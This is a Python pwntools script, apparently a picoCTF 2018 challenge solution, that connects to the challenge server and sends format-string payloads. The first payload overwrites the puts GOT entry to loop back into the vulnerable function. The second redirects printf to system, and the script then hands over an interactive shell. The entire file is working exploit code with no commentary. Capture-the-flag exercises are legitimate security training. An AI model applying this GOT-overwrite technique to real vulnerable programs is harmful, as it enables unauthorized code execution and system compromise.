import struct
import pwn

conn = pwn.remote('2018shell3.picoctf.com',56800)

puts = 0x804a01c
sys = 0x8048460
printf = 0x804a010
vuln_addr = 0x080485ab


print conn.recvuntil("message:")
exploit = ""
exploit += struct.pack('I', puts+2)
exploit += struct.pack('I', puts)
exploit += "%" + str(0x804 - 8) + "x"
exploit += "%7$hn"
exploit += "%" + str(0x85ab - 0x804) + "x"
exploit += "%8$hn"

conn.send(exploit)
print conn.recvuntil("message:")


exploit = ""
exploit += struct.pack('I', printf+2)
exploit += struct.pack('I', printf)
exploit += "%" + str(0x804 - 8) + "x"
exploit += "%7$hn"
exploit += "%" + str(0x8460 - 0x804) + "x"
exploit += "%8$hn"

conn.send(exploit)

conn.interactive()